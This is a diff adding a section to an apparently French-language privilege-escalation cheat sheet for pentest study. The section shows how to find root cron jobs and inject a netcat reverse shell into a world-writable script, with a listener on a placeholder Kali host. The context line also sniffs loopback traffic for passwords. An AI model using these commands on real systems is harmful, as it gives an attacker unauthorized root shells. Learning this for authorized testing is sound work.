@@ -289,3 +289,34 @@ sudo tcpdump -i lo -A | grep "pass"
 
 ## Insecure file permissions
 
+### Abusing cron jobs
+
+**Identifier les cron jobs root dans les logs**
+
+```bash
+grep "CRON" /var/log/syslog
+```
+
+**Vérifier le contenu et les permissions du script**
+
+```bash
+cat /home/joe/.scripts/user_backups.sh
+ls -lah /home/joe/.scripts/user_backups.sh
+```
+
+Si le script est world-writable (`-rwxrwxrw-`) et exécuté par root, on peut y injecter un reverse shell.
+
+**Injecter un reverse shell**
+
+```bash
+echo >> user_backups.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <kali-ip> 4444 >/tmp/f" >> user_backups.sh
+```
+
+**Listener sur Kali**
+
+```bash
+nc -lnvp 4444
+```
+
+
